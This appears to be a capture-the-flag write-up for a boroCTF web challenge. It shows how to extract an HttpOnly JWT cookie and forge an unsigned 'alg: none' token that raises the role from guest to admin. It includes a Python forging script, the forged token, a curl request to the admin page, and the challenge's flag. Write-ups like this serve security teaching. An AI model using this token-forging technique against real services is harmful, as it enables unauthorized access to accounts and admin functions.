# boroCTF 2026 — Jay W. Tee (Web, 200pts)

**Author:** Solarity  
**Category:** Web  

## Description

> Mr. Jay W. Tee seems to think his website is pretty secure.  
> https://lt560zwl9uv6.boroctf.com/

---

## Solution

### Step 1 — Recognize the vulnerability from the name

"Jay W. Tee" = **J.W.T.** = **JSON Web Token**. The challenge name is the hint. Classic JWT attack vectors:
- `alg: none` — server accepts unsigned tokens
- Weak secret brute-force (HS256)
- Algorithm confusion (RS256 → HS256)

### Step 2 — Enter the application

The login page says *"Any credentials will work. The lobby is open to everyone."* Log in with any username/password (e.g. `aaa`/`aaa`). You land on a dashboard showing `role: guest` and a `/admin` button that returns **Access Denied**.

### Step 3 — Find the JWT

`document.cookie` returns empty — the token is set with the `HttpOnly` flag, making it invisible to JavaScript. This does **not** mean there are no cookies.

To find it: **Network tab → click the `dashboard` GET request → Cookies tab → Request Cookies**. The `token` cookie is there:

```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSIsInJvbGUiOiJndWVzdCJ9.uS0euZulTCv_Ps4Rj1SoyKoJxDbAj9B-iUQOysKrRRo
```

### Step 4 — Decode the JWT

A JWT has three base64url-encoded parts separated by dots: `header.payload.signature`.

```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"username":"aaa","role":"guest"}
```

The payload contains `role: guest`. We need `role: admin`.

### Step 5 — Forge a token with `alg: none`

The `alg: none` attack works when the server accepts tokens without verifying the signature. Set `alg` to `none` in the header, change `role` to `admin` in the payload, and omit the signature entirely (leave the trailing dot).

```python
import base64, json

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = json.dumps({"alg": "none", "typ": "JWT"}, separators=(',',':'))
payload = json.dumps({"username": "aaa", "role": "admin"}, separators=(',',':'))

token = b64url(header) + '.' + b64url(payload) + '.'
print(token)
```

Result:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFhYSIsInJvbGUiOiJhZG1pbiJ9.
```

### Step 6 — Send the forged token

Because the cookie is `HttpOnly`, JavaScript cannot set it. Use `curl` to send the request manually with the forged token in the `Cookie` header:

```bash
curl -s https://lt560zwl9uv6.boroctf.com/admin \
  -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFhYSIsInJvbGUiOiJhZG1pbiJ9."
```

`curl` flags:
- `-s` — silent (hides progress bar, shows only the response body)
- `-H "Cookie: ..."` — manually sets the Cookie request header, bypassing the browser's HttpOnly restriction

The server returns HTML with **Access Granted** and the flag.

---

## Flag

```
boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}
```

---

## Key takeaways

- **Challenge name = hint**: "Jay W. Tee" → JWT. Read challenge names carefully
- **`document.cookie` empty ≠ no cookies**: `HttpOnly` cookies are sent by the browser automatically but hidden from JavaScript. Always check Network tab → Cookies for the full picture
- **`alg: none` attack**: JWT libraries that don't enforce algorithm validation will accept a token with no signature if `alg` is set to `none`. The payload is fully attacker-controlled
- **`curl -H "Cookie: ..."` bypasses HttpOnly**: the browser enforces HttpOnly for JS; `curl` doesn't care — it sends whatever header you give it
- **Flag buried in noisy HTML**: when curl returns a wall of HTML, paste it into an LLM rather than scanning by eye — humans lose focus in repetitive markup, LLMs read it flat
